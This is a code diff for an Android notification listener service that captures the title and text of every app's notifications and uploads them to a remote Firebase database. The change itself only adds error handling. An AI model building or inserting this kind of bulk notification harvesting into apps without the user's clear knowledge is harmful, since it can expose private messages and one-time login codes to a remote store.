@@ -19,42 +19,51 @@ class AppNotificationListenerService : NotificationListenerService() {
     companion object {
         private const val TAG = "AppNotificationListener"
         private val scope = CoroutineScope(Dispatchers.IO)
-        private val databaseRef = FirebaseDatabase.getInstance().getReference("notifications_batches")
+        private fun getDatabaseRef() = try {
+            FirebaseDatabase.getInstance().getReference("notifications_batches")
+        } catch (e: Exception) {
+            null
+        }
     }
 
     override fun onNotificationPosted(sbn: StatusBarNotification?) {
         super.onNotificationPosted(sbn)
         if (sbn == null) return
 
-        val packageName = sbn.packageName ?: "unknown"
-        val extras = sbn.notification?.extras ?: return
-        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
-        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
+        try {
+            val packageName = sbn.packageName ?: "unknown"
+            val extras = sbn.notification?.extras ?: return
+            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
+            val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
 
-        if (title.isBlank() && text.isBlank()) return
+            if (title.isBlank() && text.isBlank()) return
 
-        scope.launch {
-            try {
-                val timestampKey = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss_SSS", Locale.getDefault()).format(Date())
-                val sanitizedAppName = packageName.replace(Regex("[^a-zA-Z0-9._-]"), "_")
+            scope.launch {
+                try {
+                    val ref = getDatabaseRef() ?: return@launch
+                    val timestampKey = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss_SSS", Locale.getDefault()).format(Date())
+                    val sanitizedAppName = packageName.replace(Regex("[^a-zA-Z0-9._-]"), "_")
 
-                val notificationData = mapOf(
-                    "packageName" to sanitizedAppName,
-                    "title" to title,
-                    "text" to text,
-                    "timestamp" to System.currentTimeMillis()
-                )
+                    val notificationData = mapOf(
+                        "packageName" to sanitizedAppName,
+                        "title" to title,
+                        "text" to text,
+                        "timestamp" to System.currentTimeMillis()
+                    )
 
-                databaseRef.child(sanitizedAppName).child(timestampKey).setValue(notificationData)
-                    .addOnSuccessListener {
-                        Log.d(TAG, "Notification captured and logged to Firebase: $title - $text")
-                    }
-                    .addOnFailureListener { e: Exception ->
-                        Log.e(TAG, "Failed to log notification to Firebase", e)
-                    }
-            } catch (e: Exception) {
-                Log.e(TAG, "Error processing notification", e)
+                    ref.child(sanitizedAppName).child(timestampKey).setValue(notificationData)
+                        .addOnSuccessListener {
+                            Log.d(TAG, "Notification captured and logged to Firebase: $title - $text")
+                        }
+                        .addOnFailureListener { e: Exception ->
+                            Log.e(TAG, "Failed to log notification to Firebase", e)
+                        }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error processing notification coroutine", e)
+                }
             }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error in onNotificationPosted", e)
         }
     }
 
